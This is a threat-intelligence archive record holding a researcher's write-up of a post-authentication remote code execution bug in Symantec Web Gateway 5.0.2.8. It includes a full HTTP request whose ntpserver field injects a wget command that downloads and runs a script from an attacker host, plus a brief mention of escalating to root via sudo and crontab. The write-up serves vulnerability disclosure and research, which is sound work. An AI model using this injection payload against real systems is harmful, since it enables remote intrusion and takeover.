{
    "id": "e373f1a8-c670-42f9-9e51-79257e2bc13a",
    "created_at": "2022-10-25T16:48:20.879167Z",
    "updated_at": "2025-03-27T02:08:40.647951Z",
    "deleted_at": null,
    "sha1_hash": "8b9b54205c177b3ba28aac769f87ae6878753359",
    "title": "hunting 0days",
    "authors": "",
    "file_creation_date": "2020-03-26T16:00:26Z",
    "file_modification_date": "2020-03-26T16:00:26Z",
    "file_size": 919199,
    "plain_text": "-----\n\n## Contents\nIntro ......................................................................................................................................................... 2\n\nEnvironment ............................................................................................................................................ 3\n\nResults ..................................................................................................................................................... 4\n\nSummary ................................................................................................................................................. 8\n\nResources ................................................................................................................................................ 9\n\n\n-----\n\n## Intro\n\n[„Hunting 0days”[1] is a small series of articles created as a step-by-step „guide” where I’m](https://patreon.com/CodySixteen)\ntrying to describe how I found a „real life bug(s)” that can – and will – lead to remote code execution.\n\nIn this document we will talk about RCE vulnerabilty I found in Symantec Web Gateway (v.5.0.2.8)\nduring an afterhour research (26.03.2020). Described bug is available for authorized users only (so\ncalled postauth; in default installation we will talk about the user called admin).\n\nBelow you will find the details. In case of any questions – you know how to find me. ;)\n\nEnjoy and have fun!\n\n[Cody Sixteen](https://code610.blogspot.com/)\n\n\n-----\n\n## Environment\nThis time our environment will be based on Symantec Web Gateway VM. To prepare an attack\nscenario I used two virtual machines:\n\n  - Symantec Web Gateway VM (5.0.2.8) – default installation\n\n  - Kali Linux – with my tools and scripts; used as a jumphost\n\nFrom 3rd machine – my Windows 10 (host) – I was using Burp Suite to intercept the request.\n\n[(Similar environment was described in multiple cases presented on the blog[1].)](https://code610.blogspot.com/)\n\nWith all the settings prepared – we are now ready to go! ;)\n\n\n-----\n\n## Results\nWhen you’re logged-in user – it should be pretty easy to run your own code according to our\n[previous adventures [2,](https://code610.blogspot.com/2020/03/postauth-rce-bugs-in-nagiosxi-5611.html) [3, 4]. Let’s go directly to the console:](https://code610.blogspot.com/2020/03/postauth-rce-in-manageengine-14.html)\n\nAs you can see I decided to go directly to the webroot of Symantec Web Gateway to grep for some\n[‘known vulnerable PHP functions’[5] in the files inside the directory. I found multiple vulnerable](https://lmgtfy.com/?q=php+vulnerable+functions)\nplaces but today we will check continueConfig.php file. It looks like a very good example:\n\nTo prepare your own request (presented below) go to the Administration -> Configuration and then\nclick to the Time tab. It will let you configure NTP server (as you can see below ;)):\n\nLet’s verify in the VM’s console if the file was created:\n\n\n-----\n\n[Yes! ;] So our next step should be to get reverse shell[6]. I tried the same approach as we saw](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)\nbefore[2,3] but there was a little surprise for me from the Vendor:\n\n[Yep. So I tried something else. On the Kali VM I prepared a oneliner[6] and started „python –m](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)\n_SimpleHTTPServer 80” to wait for WebGateway’s request:_\n\nFull request to the application is presented on the screen below:\n\n\n-----\n\nIf you want to check it, below is the copy in the table with example payload I used:\n\nPOST /spywall/timeConfig.php HTTP/1.1\nHost: 192.168.216.133\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: pl,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 146\nOrigin: https://192.168.216.133\nConnection: close\nReferer: https://192.168.216.133/spywall/timeConfig.php\nCookie: PHPSESSID=8f076c1f7bac2b403cf39711fd301533\nUpgrade-Insecure-Requests: 1\n\nposttime=1585228657&saveForm=Save&timesync=1&ntpserver=qweqwe.com;$(wget%20http://192.168.1.\n170/a.sh%20-O%20/tmp/a.sh;sh%20/tmp/a.sh);#&timezone=5\n\nYour results should be similar to those presented on the screen below:\n\nWell. Great but not the best. ;) Don’t worry Vendor is always prepared for the support, so let’s check\nwhat’s inside sudo... ;)\n\n\n-----\n\nResults presented on the next screen:\n\nAs you can see there are multiple ways to achieve root-access now. I decided to use crontab:\n\nLooks like this is IT! Done. ;)\n\n\n-----\n\n## Summary\nIn this short document I tried to present you one of the possible way of gaining root shell access\nSymantec Web Gateway 5.0.2.8. Functionality described in this document is only available for\nauthorized users.\n\nIf logged-in user is able to prepare and store his/her own script or code to run on remote machine –\ncode will be executed with the webserver privileges on the system. Because of improper\nconfiguration webserver-user (apache) can use OS tools to gain root level access.\n\nI hope this paper will help you understand that: user’s input should be filtered in all cases. ;)\n\nSee you next time!\n\nCheers,\n\n[Cody](https://twitter.com/CodySixteen)\n\n\n-----\n\n## Resources\nBelow you will find resources used/found when I was creating this document:\n\n[[1] Mini arts series](https://code610.blogspot.com/p/mini-arts.html)\n\n[[2] Bugs in NagiosXI](https://code610.blogspot.com/2020/03/postauth-rce-bugs-in-nagiosxi-5611.html)\n\n[[3] RCE in ManageEngine](https://code610.blogspot.com/2020/03/postauth-rce-in-manageengine-14.html)\n\n[[4] Official Blog](https://code610.blogspot.com/)\n\n[5] Vulnerable PHP functions\n\n[[6] PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)\n\n[[7] @CodySixteen](https://twitter.com/CodySixteen)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://dl.packetstormsecurity.net/2004-exploits/symantecwg5028-exec.pdf"
    ],
    "report_names": [
        "symantecwg5028-exec.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1585238426,
    "ts_modification_date": 1585238426,
    "files": {
        "pdf": "https://archive.orkl.eu/8b9b54205c177b3ba28aac769f87ae6878753359.pdf",
        "text": "https://archive.orkl.eu/8b9b54205c177b3ba28aac769f87ae6878753359.txt",
        "img": "https://archive.orkl.eu/8b9b54205c177b3ba28aac769f87ae6878753359.jpg"
    }
}